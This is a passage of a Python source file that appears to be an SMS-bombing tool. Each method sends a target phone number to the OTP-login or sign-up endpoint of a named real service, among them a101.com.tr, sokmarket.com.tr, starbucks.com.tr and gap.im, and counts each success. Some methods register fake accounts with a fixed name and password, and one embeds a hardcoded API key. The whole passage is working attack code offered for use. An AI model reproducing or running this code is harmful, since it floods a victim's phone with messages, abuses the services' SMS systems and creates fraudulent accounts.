            if r.status_code in [200, 204]:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> defacto.com.tr")
                self.adet += 1
            else: raise
        except: print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> defacto.com.tr")

    #a101.com.tr
    def A101(self):
        try:
            url = "https://www.a101.com.tr/api/v1/users/otp-login/"
            headers = self.get_headers("https://www.a101.com.tr/", "https://www.a101.com.tr")
            json = {"phone": self.phone}
            r = requests.post(url, headers=headers, json=json, timeout=6)
            if r.status_code in [200, 201, 204]:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> a101.com.tr")
                self.adet += 1
            else: raise
        except: print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> a101.com.tr")

    #sokmarket.com.tr
    def Sok(self):
        try:
            url = "https://api.sokmarket.com.tr/api/v1/users/otp-login"
            headers = self.get_headers("https://www.sokmarket.com.tr/", "https://www.sokmarket.com.tr")
            headers.update({"X-Channel": "Web", "X-Client-Version": "1.0.0"})
            json = {"mobile_number": self.phone}
            r = requests.post(url, headers=headers, json=json, timeout=6)
            if r.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> sokmarket.com.tr")
                self.adet += 1
            else: raise
        except: print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> sokmarket.com.tr")

    #kigili.com
    def Kigili(self):
        try:
            url = "https://www.kigili.com/users/registration/"
            headers = self.get_headers("https://www.kigili.com/", "https://www.kigili.com")
            headers.update({"Content-Type": "application/x-www-form-urlencoded"})
            data = f"first_name=Memati&last_name=Bas&email=memati{self.phone}@gmail.com&phone=0{self.phone}&password=Sifre123!&confirm=true&kvkk=true&next="
            r = requests.post(url, headers=headers, data=data, timeout=6)
            if r.status_code in [200, 202]:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> kigili.com")
                self.adet += 1
            else: raise
        except: print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> kigili.com")

    #starbucks.com.tr
    def Starbucks(self):
        try:
            url = "https://auth.sbuxtr.com:443/signUp"
            headers = self.get_headers("https://www.starbucks.com.tr/", "https://www.starbucks.com.tr")
            headers.update({"Operationchannel": "ios", "Device-token": f"device_{randint(100000,999999)}"})
            json = {"allowEmail": True, "allowSms": True, "deviceId": f"{randint(1000,9999)}-{randint(1000,9999)}", "email": f"memati{self.phone}@gmail.com", "firstName": "Memati", "lastName": "Bas", "password": "Sifre123!", "phoneNumber": self.phone, "preferredName": "Memati"}
            r = requests.post(url, headers=headers, json=json, timeout=6)
            if r.status_code in [200, 201, 202]:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> starbucks.com.tr")
                self.adet += 1
            else: raise
        except: print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> starbucks.com.tr")

    # --- NEWLY ADDED SERVICES FROM NODE.JS ---

    def Sakasu(self):
        try:
            r = requests.post('https://www.sakasu.com.tr:443/app/api_register/step1', data={"phone": "0"+self.phone}, timeout=6)
            if r.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> sakasu.com.tr")
                self.adet += 1
            else: raise
        except: print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> sakasu.com.tr")

    def ZarinPlus(self):
        try:
            headers = self.get_headers("https://zarinplus.com/", "https://zarinplus.com")
            r = requests.post('https://api.zarinplus.com/user/zarinpal-login', json={"phone_number": "90"+self.phone}, headers=headers, timeout=6)
            if r.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> zarinplus.com")
                self.adet += 1
            else: raise
        except: print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> zarinplus.com")

    def CoreGap(self):
        try:
            r = requests.post(f'https://core.gap.im/v1/user/add.json?mobile=90{self.phone}', timeout=6)
            if r.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> gap.im")
                self.adet += 1
            else: raise
        except: print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> gap.im")

    def Rentiva(self):
        try:
            r = requests.post('https://rentiva.com:443/api/Account/Login', json={"phone": self.phone, "type": 1}, timeout=6)
            if r.status_code in [200, 201, 202]:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> rentiva.com")
                self.adet += 1
            else: raise
        except: print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> rentiva.com")

    def LoncaMarket(self):
        try:
            url = 'https://www.loncamarket.com/lid/identity/sendconfirmationcode'
            headers = self.get_headers("https://www.loncamarket.com/", "https://www.loncamarket.com")
            json = {"Address": self.phone, "ConfirmationType": 0}
            r = requests.post(url, json=json, headers=headers, timeout=6)
            if r.status_code in [200, 201]:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> loncamarket.com")
                self.adet += 1
            else: raise
        except: print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> loncamarket.com")

    def Happy(self):
        try:
            r = requests.post('https://www.happy.com.tr:443/index.php?route=account/register/verifyPhone', data={"telephone": self.phone}, timeout=6)
            if r.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> happy.com.tr")
                self.adet += 1
            else: raise
        except: print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> happy.com.tr")

    def KuryemGelsin(self):
        try:
            url = 'https://api.kuryemgelsin.com:443/tr/api/users/registerMessage/'
            headers = self.get_headers("https://kuryemgelsin.com/", "https://kuryemgelsin.com")
            json = {"phoneNumber": self.phone, "phone_country_code": "+90"}
            r = requests.post(url, headers=headers, json=json, timeout=6)
            if r.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> kuryemgelsin.com")
                self.adet += 1
            else: raise
        except: print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> kuryemgelsin.com")

    def Taksim(self):
        try:
            url = 'https://service.taksim.digital/services/PassengerRegister/Register'
            headers = self.get_headers("https://taksim.digital/", "https://taksim.digital")
            json = {"countryPhoneCode": '+90', "phoneNo": self.phone}
            r = requests.post(url, headers=headers, json=json, timeout=6)
            if r.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> taksim.digital")
                self.adet += 1
            else: raise
        except: print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> taksim.digital")

    def ClickMe(self):
        try:
            url = 'https://mobile-gateway.clickmelive.com:443/api/v2/authorization/code'
            headers = self.get_headers("https://clickmelive.com/", "https://clickmelive.com")
            headers.update({"Authorization": "apiKey 617196fc65dc0778fb59e97660856d1921bef5a092bb4071f3c071704e5ca4cc"})
            json={"phone": self.phone}
            r = requests.post(url, json=json, headers=headers, timeout=6)
            if r.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> clickmelive.com")
                self.adet += 1
            else: raise
        except: print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> clickmelive.com")